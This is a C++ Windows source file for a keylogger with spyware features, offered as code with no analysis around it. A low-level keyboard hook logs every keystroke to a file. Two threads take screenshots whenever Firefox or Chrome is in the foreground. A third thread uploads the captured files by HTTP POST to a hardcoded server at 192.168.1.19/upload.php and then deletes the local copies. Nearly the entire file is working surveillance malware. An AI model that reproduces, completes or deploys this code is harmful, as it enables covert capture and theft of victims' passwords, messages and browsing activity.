#include <iostream>
#include <Windows.h>
#include <psapi.h>
#include <string>
#include <thread>
#include <gdiplus.h>
#include <wininet.h>
#include <filesystem>
#include <fstream>

#pragma comment(lib, "Gdiplus.lib")
#pragma comment(lib, "wininet.lib")

using namespace std;
using namespace Gdiplus;

HHOOK _hook;


std::string GetExecutableDir() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    std::string fullPath(path);
    size_t lastSlash = fullPath.find_last_of("\\/");
    if (lastSlash != std::string::npos) {
        return fullPath.substr(0, lastSlash);  // Remove filename
    }
    return fullPath; // fallback
}

bool CreateSubfolder(const std::string& basePath, const std::string& subfolderName) {
    std::string fullPath = basePath + "\\" + subfolderName;

    if (CreateDirectoryA(fullPath.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
        std::cout << "[+] Folder created (or already exists): " << fullPath << std::endl;
        return true;
    }
    else {
        std::cerr << "[-] Failed to create folder: " << fullPath
            << " | Error: " << GetLastError() << std::endl;
        return false;
    }
}

INT GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;

    ImageCodecInfo* pImage = NULL;

    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;

    pImage = (ImageCodecInfo*)(malloc(size));
    if (pImage == NULL) return -1;

    GetImageEncoders(num, size, pImage);

    for (UINT j = 0;j < num;j++) {
        if (wcscmp(pImage[j].MimeType, format) == 0) {
            *pClsid = pImage[j].Clsid;
            free(pImage);
            return j;
        }
    }
    free(pImage);
    return -1;
}

void takeScreenshot() {
    std::string exeDir = GetExecutableDir();
    std::wstring wExeDir(exeDir.begin(), exeDir.end());
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMemDC = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmScreen = NULL;

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    GdiplusStartupInput gdip;
    ULONG_PTR gdipToken;
    GdiplusStartup(&gdipToken, &gdip, NULL);

    hbmScreen = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    SelectObject(hdcMemDC, hbmScreen);

    BitBlt(hdcMemDC, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

    CLSID encoderID;
    GetEncoderClsid(L"image/png", &encoderID);

    std::wstring file = wExeDir + L"\\capture\\image" + std::to_wstring(GetTickCount()) + L".png";

    Bitmap* bmp = new Bitmap(hbmScreen, (HPALETTE)0);
    bmp->Save(file.c_str(), &encoderID, NULL);

    GdiplusShutdown(gdipToken);

    DeleteObject(hbmScreen);
    DeleteDC(hdcMemDC);
    ReleaseDC(NULL, hdcScreen);
}

DWORD GetProcessIdFromWindowsHandle(HWND hwnd) {
    DWORD pid = 0;
    GetWindowThreadProcessId(hwnd, &pid);
    return pid;
}

void isFirefox() {
    while (true) {
        Sleep(10000);
        HWND hForegroundWindow = GetForegroundWindow();
        if (hForegroundWindow != NULL) {
            DWORD foregroundPid = GetProcessIdFromWindowsHandle(hForegroundWindow);

            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, foregroundPid);
            if (!hProcess) {
                cout << "[-] Failed to open process with PID " << foregroundPid << endl;
                CloseHandle(hForegroundWindow);
            }

            TCHAR processName[MAX_PATH] = TEXT("<unknown>");

            if (GetModuleFileNameEx(hProcess, NULL, processName, MAX_PATH)) {
                wstring ws(processName);
                string exeName(ws.begin(), ws.end());

                if (exeName.find("firefox.exe") != string::npos) {
                    CloseHandle(hProcess);
                    CloseHandle(hForegroundWindow);
                    takeScreenshot();
                }
            }
            else {
                cout << "[-] Unable to get process name for PID " << foregroundPid << endl;
            }

            CloseHandle(hProcess);
            CloseHandle(hForegroundWindow);
        }
        CloseHandle(hForegroundWindow);
    }
}

void isChrome() {
    while (true) {
        Sleep(10000);
        HWND hForegroundWindow = GetForegroundWindow();
        if (hForegroundWindow != NULL) {
            DWORD foregroundPid = GetProcessIdFromWindowsHandle(hForegroundWindow);

            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, foregroundPid);
            if (!hProcess) {
                cout << "[-] Failed to open process with PID " << foregroundPid << endl;
                CloseHandle(hForegroundWindow);
            }

            TCHAR processName[MAX_PATH] = TEXT("<unknown>");

            if (GetModuleFileNameEx(hProcess, NULL, processName, MAX_PATH)) {
                wstring ws(processName);
                string exeName(ws.begin(), ws.end());

                if (exeName.find("chrome.exe") != string::npos) {
                    CloseHandle(hProcess);
                    CloseHandle(hForegroundWindow);
                    takeScreenshot();
                }
            }
            else {
                cout << "[-] Unable to get process name for PID " << foregroundPid << endl;
            }

            CloseHandle(hProcess);
            CloseHandle(hForegroundWindow);
        }
        CloseHandle(hForegroundWindow);
    }
}

LRESULT __stdcall appendFile(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;

        const char* keystroke = NULL;
        if (kbdStruct->vkCode == VK_F1) {
            keystroke = "<F1>";
        }else if (kbdStruct->vkCode == VK_F2) {
            keystroke = "<F2>";
        }else if (kbdStruct->vkCode == VK_F3) {
            keystroke = "<F3>";
        }else if (kbdStruct->vkCode == VK_F4) {
            keystroke = "<F4>";
        }else if (kbdStruct->vkCode == VK_F5) {
            keystroke = "<F5>";
        }else if (kbdStruct->vkCode == VK_F6) {
            keystroke = "<F6>";
        }else if (kbdStruct->vkCode == VK_F7) {
            keystroke = "<F7>";
        }else if (kbdStruct->vkCode == VK_F8) {
            keystroke = "<F8>";
        }else if (kbdStruct->vkCode == VK_F9) {
            keystroke = "<F9>";
        }else if (kbdStruct->vkCode == VK_F10) {
            keystroke = "<F10>";
        }else if (kbdStruct->vkCode == VK_F11) {
            keystroke = "<F11>";
        }else if (kbdStruct->vkCode == VK_F12) {
            keystroke = "<F12>";
        }else if (kbdStruct->vkCode == VK_BACK) {
            keystroke = "<BACKSPACE>";
        }else if (kbdStruct->vkCode == VK_TAB) {
            keystroke = "<TAB>";
        }else if (kbdStruct->vkCode == VK_RETURN) {
            keystroke = "<ENTER>";
        }else if (kbdStruct->vkCode == VK_SHIFT) {
            keystroke = "<SHIFT>";
        }else if (kbdStruct->vkCode == VK_CONTROL) {
            keystroke = "<ctrl>";
        }else if (kbdStruct->vkCode == VK_MENU) {
            keystroke = "<alt>";
        }else if (kbdStruct->vkCode == VK_CAPITAL) {
            keystroke = "<Caps-lock>";
        }else if (kbdStruct->vkCode == VK_ESCAPE) {
            keystroke = "<Esc>";
        }else if (kbdStruct->vkCode == VK_SPACE) {
            keystroke = "<Spacebar>";
        }else if (kbdStruct->vkCode == VK_PRIOR) {
            keystroke = "<Page-up>";
        }else if (kbdStruct->vkCode == VK_NEXT) {
            keystroke = "<Page-down>";
        }else if (kbdStruct->vkCode == VK_END) {
            keystroke = "<End>";
        }else if (kbdStruct->vkCode == VK_HOME) {
            keystroke = "<Home>";
        }else if (kbdStruct->vkCode == VK_LEFT) {
            keystroke = "<Left-arrow>";
        }else if (kbdStruct->vkCode == VK_UP) {
            keystroke = "<Up-arrow>";
        }else if (kbdStruct->vkCode == VK_RIGHT) {
            keystroke = "<Right-arrow>";
        }else if (kbdStruct->vkCode == VK_DOWN) {
            keystroke = "<Down-arrow>";
        }else if (kbdStruct->vkCode == VK_DELETE) {
            keystroke = "<Delete>";
        }else if (kbdStruct->vkCode == VK_INSERT) {
            keystroke = "<Insert>";
        }else if (kbdStruct->vkCode == VK_HELP) {
            keystroke = "<Help>";
        }else if (kbdStruct->vkCode == '0') {
            keystroke = "0";
        }else if (kbdStruct->vkCode == '1') {
            keystroke = "1";
        }else if (kbdStruct->vkCode == '2') {
            keystroke = "2";
        }else if (kbdStruct->vkCode == '3') {
            keystroke = "3";
        }else if (kbdStruct->vkCode == '4') {
            keystroke = "4";
        }else if (kbdStruct->vkCode == '5') {
            keystroke = "5";
        }else if (kbdStruct->vkCode == '6') {
            keystroke = "6";
        }else if (kbdStruct->vkCode == '7') {
            keystroke = "7";
        }else if (kbdStruct->vkCode == '8') {
            keystroke = "8";
        }else if (kbdStruct->vkCode == '9') {
            keystroke = "9";
        }else if (kbdStruct->vkCode == VK_LWIN) {
            keystroke = "<Left-Windows-logo>";
        }else if (kbdStruct->vkCode == VK_RWIN) {
            keystroke = "<Right-Windows-logo>";
        }else if (kbdStruct->vkCode == VK_APPS) {
            keystroke = "<Application>";
        }else if (kbdStruct->vkCode == VK_NUMPAD0) {
            keystroke = "<Numeric-keypad-0>";
        }else if (kbdStruct->vkCode == VK_NUMPAD1) {
            keystroke = "<Numeric-keypad-1>";
        }else if (kbdStruct->vkCode == VK_NUMPAD2) {
            keystroke = "<Numeric-keypad-2>";
        }else if (kbdStruct->vkCode == VK_NUMPAD3) {
            keystroke = "<Numeric-keypad-3>";
        }else if (kbdStruct->vkCode == VK_NUMPAD4) {
            keystroke = "<Numeric-keypad-4>";
        }else if (kbdStruct->vkCode == VK_NUMPAD5) {
            keystroke = "<Numeric-keypad-5>";
        }else if (kbdStruct->vkCode == VK_NUMPAD6) {
            keystroke = "<Numeric-keypad-6>";
        }else if (kbdStruct->vkCode == VK_NUMPAD7) {
            keystroke = "<Numeric-keypad-7>";
        }else if (kbdStruct->vkCode == VK_NUMPAD8) {
            keystroke = "<Numeric-keypad-8>";
        }else if (kbdStruct->vkCode == VK_NUMPAD9) {
            keystroke = "<Numeric-keypad-9>";
        }else if (kbdStruct->vkCode == VK_MULTIPLY) {
            keystroke = "*";
        }else if (kbdStruct->vkCode == VK_ADD) {
            keystroke = "+";
        }else if (kbdStruct->vkCode == VK_SUBTRACT) {
            keystroke = "-";
        }else if (kbdStruct->vkCode == VK_DIVIDE) {
            keystroke = "/";
        }else if (kbdStruct->vkCode == VK_SEPARATOR) {
            keystroke = "<Separator>";
        }else if (kbdStruct->vkCode == VK_NUMLOCK) {
            keystroke = "<Num-lock>";
        }else if (kbdStruct->vkCode == VK_BROWSER_BACK) {
            keystroke = "<Browser-Back>";
        }else if (kbdStruct->vkCode == VK_BROWSER_FORWARD) {
            keystroke = "<Browser-Forward>";
        }else if (kbdStruct->vkCode == VK_BROWSER_REFRESH) {
            keystroke = "<Browser-Refresh>";
        }else if (kbdStruct->vkCode == VK_BROWSER_STOP) {
            keystroke = "<Browser-stop>";
        }else if (kbdStruct->vkCode == VK_BROWSER_SEARCH) {
            keystroke = "<Browser-search>";
        }else if (kbdStruct->vkCode == VK_LSHIFT) {
            keystroke = "<Left-shift>";
        }else if (kbdStruct->vkCode == VK_RSHIFT) {
            keystroke = "<Right-shift>";
        }else if (kbdStruct->vkCode == VK_LMENU) {
            keystroke = "<Left-alt>";
        }else if (kbdStruct->vkCode == VK_RMENU) {
            keystroke = "<Right-alt>";
        }
        else if (kbdStruct->vkCode == 'A') {
            keystroke = "a";
        }else if (kbdStruct->vkCode == 'B') {
            keystroke = "b";
        }else if (kbdStruct->vkCode == 'C') {
            keystroke = "c";
        }else if (kbdStruct->vkCode == 'D') {
            keystroke = "d";
        }else if (kbdStruct->vkCode == 'E') {
            keystroke = "e";
        }else if (kbdStruct->vkCode == 'F') {
            keystroke = "f";
        }else if (kbdStruct->vkCode == 'G') {
            keystroke = "g";
        }else if (kbdStruct->vkCode == 'H') {
            keystroke = "h";
        }else if (kbdStruct->vkCode == 'I') {
            keystroke = "i";
        }else if (kbdStruct->vkCode == 'J') {
            keystroke = "j";
        }else if (kbdStruct->vkCode == 'K') {
            keystroke = "k";
        }else if (kbdStruct->vkCode == 'L') {
            keystroke = "l";
        }else if (kbdStruct->vkCode == 'M') {
            keystroke = "m";
        }else if (kbdStruct->vkCode == 'N') {
            keystroke = "n";
        }else if (kbdStruct->vkCode == 'O') {
            keystroke = "o";
        }else if (kbdStruct->vkCode == 'P') {
            keystroke = "p";
        }else if (kbdStruct->vkCode == 'Q') {
            keystroke = "q";
        }else if (kbdStruct->vkCode == 'R') {
            keystroke = "r";
        }else if (kbdStruct->vkCode == 'S') {
            keystroke = "s";
        }else if (kbdStruct->vkCode == 'T') {
            keystroke = "t";
        }else if (kbdStruct->vkCode == 'U') {
            keystroke = "u";
        }else if (kbdStruct->vkCode == 'V') {
            keystroke = "v";
        }else if (kbdStruct->vkCode == 'W') {
            keystroke = "w";
        }else if (kbdStruct->vkCode == 'X') {
            keystroke = "x";
        }else if (kbdStruct->vkCode == 'Y') {
            keystroke = "y";
        }else if (kbdStruct->vkCode == 'Z') {
            keystroke = "z";
        }

        std::string exeDir = GetExecutableDir();
        std::string file = exeDir + "\\capture\\keystrokes.txt";

        HANDLE hFile = CreateFileA(file.c_str(),
            GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            cout << "[*]Error: CreateFileA -> INVALID_HANDLE_VALUE ->" << GetLastError() << endl;
        }
        DWORD dwMove = SetFilePointer(hFile, 0, NULL, FILE_END);
        if (dwMove == INVALID_SET_FILE_POINTER) {
            cout << "[*]Error: SetFilePointer -> INVALID_SET_FILE_POINTER -> " << GetLastError() << endl;
        }

        LARGE_INTEGER fileSize;
        GetFileSizeEx(hFile, &fileSize);
        if ((double)(fileSize.QuadPart / 1024) >= 3) {
            //TODO: 1.Send everything from enum folder to the server
            //      2.Clear/Delete everything from ebum folder
        }
        DWORD bytesWritten;
        if (keystroke != NULL) {
            if (!WriteFile(hFile, keystroke, strlen(keystroke), &bytesWritten, NULL)) {
                cout << "[*]Error: WriteFile -> False -> " << GetLastError() << endl;
            }
        }
        CloseHandle(hFile);
    }

    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

int capture() {
    cout << "[+] Capturing keystrokes...\n";

    _hook = SetWindowsHookExA(WH_KEYBOARD_LL, appendFile, NULL, 0);
    if (!_hook) {
        cout << "[-] Hook failed. Error: " << GetLastError() << std::endl;
        return 0;
    }

    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 1;
}

void ReleaseHook() {
    UnhookWindowsHookEx(_hook);
}

bool UploadFileToServer(const std::string& filePath, const std::string& filename, const std::string& host, const std::string& resource) {
    HINTERNET hInternet = InternetOpenA("Uploader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    HINTERNET hConnect = InternetConnectA(hInternet, host.c_str(), INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", resource.c_str(), NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    // Read file
    std::ifstream file(filePath, std::ios::binary);
    std::string fileContents((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    std::string boundary = "----boundary123";
    std::string header = "Content-Type: multipart/form-data; boundary=" + boundary;

    std::string body =
        "--" + boundary + "\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"" + filename + "\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n" +
        fileContents + "\r\n--" + boundary + "--\r\n";

    BOOL result = HttpSendRequestA(hRequest, header.c_str(), header.length(), (LPVOID)body.c_str(), body.length());

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return result;
}

void sendAndDeleteData() {
    //std::cout << "[+] Running sendAndDeleteData function using thread!\n";
    std::string exeDir = GetExecutableDir();
    std::string captureDir = exeDir + "\\capture";
    std::string host = "192.168.1.19";
    std::string resource = "/upload.php";

    std::uintmax_t totalSize = 0;

    while (true) {
        Sleep(6000);
        // First, calculate the total size of all files in captureDir
        for (const auto& entry : std::filesystem::directory_iterator(captureDir)) {
            if (entry.is_regular_file()) {
                totalSize += std::filesystem::file_size(entry);
            }
        }
        std::cout << "Capture Directory Size: " << totalSize << std::endl;
        // Proceed only if size > 1MB (1MB = 1048576 bytes)
        if (totalSize >= 1048576) {
            std::cout << "[+] Excided 1mb\n";
            // Upload and delete files
            for (const auto& entry : std::filesystem::directory_iterator(captureDir)) {
                if (entry.is_regular_file()) {
                    std::string filePath = entry.path().string();
                    std::string filename = entry.path().filename().string();
                    std::cout << "[*] Uploading: " << filePath << std::endl;
                    if (UploadFileToServer(filePath, filename, host, resource)) {
                        std::filesystem::remove(filePath);
                        std::cout << "[+] Uploaded and Deleted: " << filePath << std::endl;
                    }
                    else {
                        std::cout << "[-] Failed to upload: " << filePath << std::endl;
                    }
                }
            }
        }
        totalSize = 0;
    }
}

int main() {
    std::string exeDir = GetExecutableDir();
    CreateSubfolder(exeDir, "capture");

    thread screenCaptureFirefoxThread(isFirefox);
    thread screenCaptureChromeThread(isChrome);
    thread screenSendAndDeleteDataThread(sendAndDeleteData);

    capture();
    ReleaseHook();

    screenCaptureFirefoxThread.join();
    screenCaptureChromeThread.join();
    screenSendAndDeleteDataThread.join();

    return 0;
}
